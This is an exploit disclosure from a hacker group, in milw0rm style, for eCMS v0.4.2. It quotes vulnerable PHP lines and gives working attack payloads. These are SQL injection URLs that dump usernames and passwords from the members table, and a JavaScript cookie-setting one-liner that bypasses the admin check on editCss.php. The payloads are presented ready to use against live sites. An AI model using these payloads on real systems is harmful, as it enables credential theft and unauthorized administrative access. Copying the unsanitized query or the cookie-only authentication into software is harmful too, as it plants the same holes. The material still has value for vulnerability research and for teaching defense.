@@ -1,0 +1,59 @@
+  #######################################################################################
+  #                                                                                     #
+  #         ...::::eCMS-v0.4.2 (SQL/PB) Multiple Remote Vulnerabilities  ::::...        #          
+  #######################################################################################
+
+Virangar Security Team
+
+www.virangar.net
+
+--------
+Discoverd By :virangar security team(hadihadi)
+
+special tnx to:MR.nosrati,black.shadowes,MR.hesy,Zahra
+
+& all virangar members & all hackerz
+
+greetz:to my best friend in the world hadi_aryaie2004
+& my lovely friend arash(imm02tal)
+-----
+1.sql injection:
+-------vuln codes in:-----------
+index.php:
+line 52:$p = $_GET['p']
+..
+..
+line 55:$query = "SELECT * FROM files WHERE cat = '$p' ORDER BY date DESC";
+---
+exploit:
+http://site.com/[patch]/index.php?p='/**/union/**/select/**/1,concat(username,0x3a,char(58),password),3,4,5,6/**/from/**/members/**/where/**/id=1/*
+or
+http://site.com/[patch]/index.php?p='/**/union/**/select/**/1,concat(username,0x3a,char(58),password),3,4,5,6/**/from/**/members/*
+#####################
+2. Remote Permission Bypass Vulnerability(Insecure Cookie Handling ):
+-------vuln codes in:-----------
+editCss.php:
+
+line 17:if(!isset($_COOKIE['pass']))
+{
+  echo('You\'re not allowed to come here! <a href=admin.php>Go back!</a>');
+} else {
+....
+...
+...
+-------
+/*
+if the cookie didn't set for you, you can't allow to see this page..but if we do somethings :) such as :
+
+javascript:document.cookie = "pass=1; path=/";
+
+now the cookie is set for you, and you can allow to see the page and edit the CSS in file "style.css"
+*/
+exploit:
+just open your browser and then type:
+javascript:document.cookie = "pass=1; path=/";
+now see the "editCss.php" and edit the cms CSS :D
+-----
+young iranian h4ck3rz
+
+# milw0rm.com [2008-05-20]
